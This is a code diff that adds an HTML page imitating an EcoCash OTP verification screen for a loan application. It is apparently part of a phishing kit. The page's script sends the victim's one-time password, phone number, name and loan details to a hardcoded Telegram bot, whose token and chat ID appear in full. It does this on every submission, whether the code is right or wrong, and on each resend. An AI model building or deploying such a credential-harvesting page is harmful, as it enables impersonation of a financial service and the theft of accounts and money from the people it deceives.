@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - OTP Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 32px;
+            color: #667eea;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .phone-display {
+            background: #f0f3ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #667eea;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+        }
+        
+        .otp-input {
+            width: 45px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: white;
+        }
+        
+        .otp-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .timer {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .timer span {
+            color: #667eea;
+            font-weight: bold;
+        }
+        
+        .btn-verify {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: transform 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-verify:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-verify:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .resend-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">EcoCash</div>
+        <h2>OTP Verification</h2>
+        <p class="subtitle">Enter the OTP sent to your number</p>
+        
+        <div class="phone-display" id="phoneDisplay">
+            Loading...
+        </div>
+        
+        <div class="otp-inputs">
+            <input type="text" class="otp-input" maxlength="1" data-index="0">
+            <input type="text" class="otp-input" maxlength="1" data-index="1">
+            <input type="text" class="otp-input" maxlength="1" data-index="2">
+            <input type="text" class="otp-input" maxlength="1" data-index="3">
+            <input type="text" class="otp-input" maxlength="1" data-index="4">
+            <input type="text" class="otp-input" maxlength="1" data-index="5">
+        </div>
+        
+        <div class="timer">
+            Resend OTP in <span id="resendTimer">109</span> seconds
+        </div>
+        
+        <button class="btn-verify" id="verifyBtn" onclick="verifyOTP()">
+            SUBMIT
+        </button>
+        
+        <div class="resend-link">
+            <a href="#" id="resendLink" onclick="resendOTP()">Resend OTP</a>
+        </div>
+        
+        <div class="footer">
+            © 2025 EcoCash. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        let otpData = {};
+        let countdownInterval = null;
+        let timeLeft = 109; // 109 seconds like in your image
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get saved data
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            otpData = JSON.parse(localStorage.getItem('otpVerification')) || {};
+            
+            // Display phone number
+            const phone = applicationData.phone || otpData.phone || '*********';
+            document.getElementById('phoneDisplay').textContent = `+263${phone}`;
+            
+            // Setup OTP inputs
+            setupOTPInputs();
+            
+            // Start countdown
+            startCountdown();
+            
+            // Auto-focus first OTP input
+            document.querySelector('.otp-input[data-index="0"]').focus();
+        });
+        
+        function setupOTPInputs() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            
+            otpInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    if (this.value.length === 1) {
+                        const nextIndex = parseInt(this.dataset.index) + 1;
+                        if (nextIndex < 6) {
+                            otpInputs[nextIndex].focus();
+                        }
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        const prevIndex = parseInt(this.dataset.index) - 1;
+                        if (prevIndex >= 0) {
+                            otpInputs[prevIndex].focus();
+                        }
+                    }
+                });
+            });
+        }
+        
+        function startCountdown() {
+            const resendTimer = document.getElementById('resendTimer');
+            const resendLink = document.getElementById('resendLink');
+            
+            function update() {
+                resendTimer.textContent = timeLeft;
+                
+                if (timeLeft > 0) {
+                    timeLeft--;
+                } else {
+                    clearInterval(countdownInterval);
+                    resendLink.style.pointerEvents = 'auto';
+                    resendLink.style.color = '#667eea';
+                }
+            }
+            
+            update();
+            countdownInterval = setInterval(update, 1000);
+        }
+        
+        function verifyOTP() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            let enteredOtp = '';
+            
+            otpInputs.forEach(input => {
+                enteredOtp += input.value;
+            });
+            
+            if (enteredOtp.length !== 6) {
+                alert('Please enter the 6-digit OTP');
+                return;
+            }
+            
+            if (enteredOtp === otpData.otp) {
+                // OTP verified successfully
+                sendVerificationSuccess(enteredOtp);
+                
+                // Redirect to qualification page (like your image 1001918218.jpg)
+                window.location.href = 'qualification.html';
+            } else {
+                // Invalid OTP
+                alert('Invalid OTP. Please try again.');
+                
+                // Send invalid attempt to Telegram
+                sendInvalidOTPToTelegram(enteredOtp);
+                
+                // Clear inputs
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+            }
+        }
+        
+        function sendVerificationSuccess(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const message = `
+✅ *OTP VERIFICATION COMPLETE*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+📱 *Phone:* +263${applicationData.phone || otpData.phone}
+🔢 *OTP Entered:* ${enteredOtp}
+👤 *Applicant:* ${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}
+✅ *Status:* Fully Verified
+
+💰 *Loan Application:*
+• Amount: $${applicationData.loanAmount || 'N/A'}
+• Term: ${applicationData.loanTerm || 'N/A'} months
+• Purpose: ${applicationData.purpose || 'N/A'}
+
+🎯 *Redirecting to Account Qualification*
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+        
+        function sendInvalidOTPToTelegram(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const message = `
+❌ *INVALID OTP ATTEMPT*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+📱 *Phone:* +263${applicationData.phone || otpData.phone}
+❌ *Wrong OTP:* ${enteredOtp}
+✅ *Correct OTP:* ${otpData.otp || 'Unknown'}
+
+🕒 *Time:* ${new Date().toLocaleString()}
+⚠️ *Client entered wrong OTP*
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+        
+        function resendOTP() {
+            if (timeLeft > 0) {
+                alert(`Please wait ${timeLeft} seconds before resending OTP`);
+                return;
+            }
+            
+            // Generate new OTP
+            const newOTP = Math.floor(100000 + Math.random() * 900000);
+            
+            // Update OTP data
+            otpData.otp = newOTP.toString();
+            otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
+            
+            localStorage.setItem('otpVerification', JSON.stringify(otpData));
+            
+            // Send new OTP to Telegram
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            sendNewOTPToTelegram(newOTP, applicationData.phone || otpData.phone);
+            
+            // Reset timer
+            timeLeft = 109;
+            startCountdown();
+            
+            // Clear inputs
+            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+            document.querySelector('.otp-input[data-index="0"]').focus();
+            
+            alert('New OTP has been sent.');
+        }
+        
+        function sendNewOTPToTelegram(otp, phone) {
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            
+            const message = `
+🔄 *OTP RESENT*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+🔢 *NEW OTP:* ${otp}
+📱 *To Phone:* +263${phone}
+⏰ *Expires:* 15 minutes
+
+🕒 *Resent at:* ${new Date().toLocaleString()}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
